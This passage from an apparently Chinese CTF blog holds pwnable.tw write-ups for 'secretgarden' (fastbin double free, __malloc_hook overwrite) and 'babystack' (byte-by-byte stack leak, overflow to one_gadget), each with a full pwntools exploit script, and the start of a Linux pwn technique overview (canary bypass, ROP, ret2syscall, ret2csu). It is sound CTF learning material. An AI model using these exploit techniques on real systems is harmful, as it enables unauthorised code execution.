class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch='amd64',os='linux',log_level='debug')</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./secretgarden"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = process(elf.path,env=&#123;<span class="string">"LD_PRELOAD"</span> : libc.path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./secretgarden"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10203</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">b'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">b'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; : &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">add     = <span class="keyword">lambda</span> len,name,color :  (sla(<span class="string">"choice : "</span>,<span class="string">"1"</span>),sla(<span class="string">"name :"</span>,str(len)),sla(<span class="string">"flower :"</span>,name),sla(<span class="string">"flower :"</span>,color))</span><br><span class="line">show    = <span class="keyword">lambda</span>                :  (sla(<span class="string">"choice : "</span>,<span class="string">"2"</span>))</span><br><span class="line">rm      = <span class="keyword">lambda</span> num            :  (sla(<span class="string">"choice : "</span>,<span class="string">"3"</span>),sla(<span class="string">"garden:"</span>,str(num)))</span><br><span class="line">clear   = <span class="keyword">lambda</span>                :  (sla(<span class="string">"choice : "</span>,<span class="string">"4"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">add(<span class="number">500</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'2'</span>,<span class="string">'2'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="string">'3'</span>,<span class="string">'3'</span>)</span><br><span class="line">rm(<span class="number">0</span>);rm(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">500</span>,<span class="string">''</span>,<span class="string">'4'</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">"flower[3] :"</span>)</span><br><span class="line">libc_addr = uu64(io.recv(<span class="number">6</span>))<span class="number">-0x3c3b0a</span></span><br><span class="line">leak(<span class="string">"libc"</span>,libc_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">malloc_hook = libc_addr + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">fake_chunk = malloc_hook<span class="number">-0x23</span></span><br><span class="line">one_gadegt_addr = libc_addr + <span class="number">0xef6c4</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">rm(<span class="number">4</span>);rm(<span class="number">5</span>);rm(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(fake_chunk),<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">19</span>+p64(one_gadegt_addr),<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">rm(<span class="number">5</span>)</span><br><span class="line">rm(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/21/garden/" target="_blank" rel="noopener">和媳妇一起学Pwn 之 Secret Garden</a></li><li><a href="https://www.lyyl.online/2019/09/27/pwnable-tw%E4%B8%AD%E7%9A%84secretgarden/" target="_blank" rel="noopener">pwnable.tw中的secretgarden</a></li></ul><h2 id="fastbin-size"><a href="#fastbin-size" class="headerlink" title="fastbin-size"></a>fastbin-size</h2><p>32位：</p><table><thead><tr><th align="left">gef fastbin item</th><th align="left">chunk size</th><th align="left">data interval</th><th align="left">fake chunk size</th></tr></thead><tbody><tr><td align="left">Fastbins[idx=0, size=0x8]</td><td align="left">0x10</td><td align="left">[0x01,0x0c] , [1,12]</td><td align="left">[0x10,0x17]</td></tr><tr><td align="left">Fastbins[idx=1, size=0x10]</td><td align="left">0x18</td><td align="left">[0x0d,0x14] , [13,20]</td><td align="left">[0x18,0x1f]</td></tr><tr><td align="left">Fastbins[idx=2, size=0x18]</td><td align="left">0x20</td><td align="left">[0x15,0x1c] , [21,28]</td><td align="left">[0x20,0x27]</td></tr><tr><td align="left">Fastbins[idx=3, size=0x20]</td><td align="left">0x28</td><td align="left">[0x1d,0x24] , [29,36]</td><td align="left">[0x28,0x2f]</td></tr><tr><td align="left">Fastbins[idx=4, size=0x28]</td><td align="left">0x30</td><td align="left">[0x25,0x2c] , [37,44]</td><td align="left">[0x30,0x37]</td></tr><tr><td align="left">Fastbins[idx=5, size=0x30]</td><td align="left">0x38</td><td align="left">[0x2d,0x34] , [45,52]</td><td align="left">[0x38,0x3f]</td></tr><tr><td align="left">Fastbins[idx=6, size=0x38]</td><td align="left">0x40</td><td align="left">[0x35,0x3c] , [53,60]</td><td align="left">[0x40,0x47]</td></tr></tbody></table><p>64 位：</p><table><thead><tr><th align="left">gef fastbin item</th><th align="left">chunk size</th><th align="left">data interval</th><th align="left">fake chunk size</th></tr></thead><tbody><tr><td align="left">Fastbins[idx=0, size=0x10]</td><td align="left">0x20</td><td align="left">[0x01,0x18] , [1,24]</td><td align="left">[0x20,0x2f]</td></tr><tr><td align="left">Fastbins[idx=1, size=0x20]</td><td align="left">0x30</td><td align="left">[0x19,0x28] , [25,40]</td><td align="left">[0x30,0x3f]</td></tr><tr><td align="left">Fastbins[idx=2, size=0x30]</td><td align="left">0x40</td><td align="left">[0x29,0x38] , [41,56]</td><td align="left">[0x40,0x4f]</td></tr><tr><td align="left">Fastbins[idx=3, size=0x40]</td><td align="left">0x50</td><td align="left">[0x39,0x48] , [57,72]</td><td align="left">[0x50,0x5f]</td></tr><tr><td align="left">Fastbins[idx=4, size=0x50]</td><td align="left">0x60</td><td align="left">[0x49,0x58] , [73,88]</td><td align="left">[0x60,0x6f]</td></tr><tr><td align="left">Fastbins[idx=5, size=0x60]</td><td align="left">0x70</td><td align="left">[0x59,0x68] , [89,104]</td><td align="left">[0x70,0x7f]</td></tr><tr><td align="left">Fastbins[idx=6, size=0x70]</td><td align="left">0x80</td><td align="left">[0x69,0x78] , [105,120]</td><td align="left">[0x80,0x8f]</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-babystack-strcpy形成栈溢出</title>
      <link href="2020/12/04/pwnable-tw-babystack-strcpy%E5%BD%A2%E6%88%90%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>2020/12/04/pwnable-tw-babystack-strcpy%E5%BD%A2%E6%88%90%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file babystack </span><br><span class="line">babystack: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;l, for GNU&#x2F;Linux 2.6.32, stripped</span><br><span class="line">$ checksec babystack </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>64位程序，保护全开，去符号表</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序本身的逻辑很简单，经典的菜单题，可以选择登陆、复制和退出</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>首先是登陆的地方，判断输入和密码是否一样取的是输入的长度，可以轻易以0x00开头通过，但是通过之后没有什么好处，倒是可以利用login挨个字节泄漏栈上信息，也就是one by one</p><p>然后是复制的地方，做了长度限制，但是登陆函数和复制函数的栈帧是重叠的，可以参考另一题：</p><p><a href="http://0bs3rver.space/2020/11/16/pwnable-tw-applestore-%E5%88%A9%E7%94%A8%E6%A0%88%E5%B9%B3%E8%A1%A1%E6%8E%A7%E5%88%B6%E5%86%85%E5%AD%98/#%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%B8%8E%E8%AE%A1%E7%AE%97" target="_blank" rel="noopener">pwnable-tw-applestore-利用栈平衡控制内存/#栈平衡与计算</a></p><p>也就是说我们可以在复制的时候规避掉<code>0x3f</code>的限制，进而覆盖主函数的栈帧</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>那么整个题目的思路也就出来了，我们可以利用one by one泄漏出栈内信息，然后构建栈完成栈溢出，最后使用one_gadget完成get shell，因为直接使用\x00无法通过最后的memcmp检验，所以还是需要爆破</p><p>使用pwndbg调试的时候给开启pie的程序高效下断点：b *$rebase(偏移)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b*$rebase(0xf5d)</span><br></pre></td></tr></table></figure><p>需要注意的是题目给的libc和我们自己的版本并不一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ strings libc_64.so.6 | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">GNU Libidn by Simon Josefsson</span><br><span class="line"></span><br><span class="line">$ strings my_ubuntu64_libc.so | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.2) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">GNU Libidn by Simon Josefsson</span><br></pre></td></tr></table></figure><p>所以本地和远程我们使用的one_gadget也不一样，但是这个提醒并没有什么用，因为我又跑不通远程，淦</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>需要注意的是题目的password写成了passowrd …所以说还是直接复制比较好，再就是login和copy不能在后面加上\n，所以我们需要使用sendafter</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch='amd64',os='linux',log_level='debug')</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./babystack"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./my_ubuntu64_libc.so"</span>)</span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./babystack"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10205</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">(len)</span>:</span></span><br><span class="line">mes = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x1</span>,<span class="number">0x100</span>):</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">sla(<span class="string">"passowrd :"</span>,mes+chr(j)+<span class="string">"\x00"</span>)</span><br><span class="line">recv = ru(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Success"</span> <span class="keyword">in</span> recv:</span><br><span class="line">mes += chr(j)</span><br><span class="line">log.success(<span class="string">"message: "</span>+mes)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>) <span class="comment"># logout</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> mes</span><br><span class="line"></span><br><span class="line">login = <span class="keyword">lambda</span> pw : (sla(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>),sa(<span class="string">"passowrd :"</span>,pw))</span><br><span class="line">logout = <span class="keyword">lambda</span> : sla(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">copy = <span class="keyword">lambda</span> strings : (sla(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>),sa(<span class="string">"Copy :"</span>,strings)) </span><br><span class="line">quit = <span class="keyword">lambda</span> : sla(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">password = leak_stack(<span class="number">0x10</span>)</span><br><span class="line">print(<span class="string">"password :"</span>+str(password))</span><br><span class="line">login(<span class="string">"\x00"</span>+<span class="string">"1"</span>*<span class="number">0x47</span>)</span><br><span class="line">copy(<span class="string">"1"</span>*<span class="number">0x3f</span>)</span><br><span class="line">logout()</span><br><span class="line">psd = leak_stack(<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">log.warn(len(psd[<span class="number">8</span>:]))</span><br><span class="line">libc_addr = u64(psd[<span class="number">8</span>:].ljust(<span class="number">0x8</span>, <span class="string">"\x00"</span>))<span class="number">-9</span>-libc.symbols[<span class="string">'_IO_file_setbuf'</span>]</span><br><span class="line">one_gadget = <span class="number">0x45226</span></span><br><span class="line">one_gadget_addr = libc_addr + one_gadget</span><br><span class="line">login(<span class="string">"\x00"</span>+<span class="string">"1"</span>*<span class="number">0x3f</span>+password+<span class="string">'a'</span>*<span class="number">0x18</span>+p64(one_gadget_addr))</span><br><span class="line">copy(<span class="string">"1"</span>*<span class="number">0x10</span>)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.lyyl.online/2019/09/24/pwnable-tw%E4%B8%AD%E7%9A%84babystack/" target="_blank" rel="noopener">pwnable-tw中的babystack</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-pwn技能树</title>
      <link href="2020/12/03/linux-pwn%E6%8A%80%E8%83%BD%E6%A0%91/"/>
      <url>2020/12/03/linux-pwn%E6%8A%80%E8%83%BD%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>最近发现对过往的知识掌握还不够，所以打算建一个自己的技能树，以此来记录自己掌握的技术，也便于发现不足。</p><p>参考资料：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/" target="_blank" rel="noopener">ctf-wiki-pwn</a></p><p><strong>二进制漏洞利用的过程，就是一步步扩大可以控制的内存的范围</strong>。</p><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p>需要重点关注的是canary，其他的保护如下：</p><ul><li>FORTIFY保护：限制格式化字串漏洞</li><li>NX保护：堆栈不可执行</li><li>PIE保护：地址随机化</li><li>RELRO保护：GOT表不可写</li><li>去除符号表（stripped）：增加逆向难度</li></ul><h3 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h3><p>用于防止栈溢出被利用的一种方法，原理是在栈的ebp下面放一个随机数，在函数返回之前会检查这个数有没有被修改，就可以检测是否发生栈溢出了。</p><h4 id="泄漏栈中的canary"><a href="#泄漏栈中的canary" class="headerlink" title="泄漏栈中的canary"></a>泄漏栈中的canary</h4><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。</p><p>需要存在合适的输入函数例如read()，不会在后面加截断符</p><h4 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h4><p>不修改canary而完成栈溢出，例如scanf把某些输入（+、-）认定为无效而不是非法，从而不修改canary而完成栈溢出</p><p><a href="http://0bs3rver.space/2020/10/29/pwnable-tw-dubblesort-%E4%BF%9D%E6%8A%A4%E5%85%A8%E5%BC%80%E6%A0%88%E6%BA%A2%E5%87%BA/#%E5%88%A9%E7%94%A8" target="_blank" rel="noopener">pwnable-tw-dubblesort-保护全开栈溢出/#利用</a></p><h4 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h4><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。</p><p>canary的最低位为0x00，之后逐次爆破，如果canary爆破不成功，则程序崩溃；爆破成功则程序进行下面的逻辑。由此可判断爆破是否成功。</p><p>我们可以利用这样的特点，彻底逐个字节将Canary爆破出来。</p><h4 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h4><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code> 函数，<code>__stack_chk_fail</code> 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><h4 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h4><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><p>参考：<a href="https://jontsang.github.io/post/34550.html" target="_blank" rel="noopener">Bypassing Canary——Override Canary in TLS</a></p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="初级ROP"><a href="#初级ROP" class="headerlink" title="初级ROP"></a>初级ROP</h3><p>ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)，例如存在后门函数等情况。</p><h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p><p>我的WP：<a href="http://0bs3rver.space/2020/11/28/pwnable-tw-death-note-%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode/" target="_blank" rel="noopener">pwnable-tw-death-note-可见字符shellcode</a></p><h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p><p>例如我们利用如下系统调用来获取 shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>我们使用各种gadgets即可</p><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><p>再就是one_gadget，应该也可以算做这类利用</p><h3 id="中级ROP"><a href="#中级ROP" class="headerlink" title="中级ROP"></a>中级ROP</h3><p>中级 ROP 主要是使用了一些比较巧妙的 Gadgets。</p><h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>C0 ; <span class="keyword">void</span> _libc_csu_init(<span class="keyword">void</span>)</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>C0                 <span class="keyword">public</span> __libc_csu_init</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>C0 __libc_csu_init proc near               ; DATA XREF: _start+<span class="number">16</span>o</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>C0                 push    r15</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>C2                 push    r14</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>C4                 mov     r15d, edi</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>C7                 push    r13</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>C9                 push    r12</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>D2                 push    rbp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>DA                 push    rbx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>DB                 mov     r14, rsi</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>DE                 mov     r13, rdx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005E1</span>                 sub     rbp, r12</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005E4</span>                 sub     rsp, <span class="number">8</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005E8</span>                 sar     rbp, <span class="number">3</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>EC                 call    _init_proc</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005F</span>1                 test    rbp, rbp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005F</span>4                 jz      short loc_400616</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005F</span>6                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005F</span>8                 nop     dword ptr [rax+rax+<span class="number">00000000</span>h]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400600</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>j</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400614</span>                 jnz     short loc_400600</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400616</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span 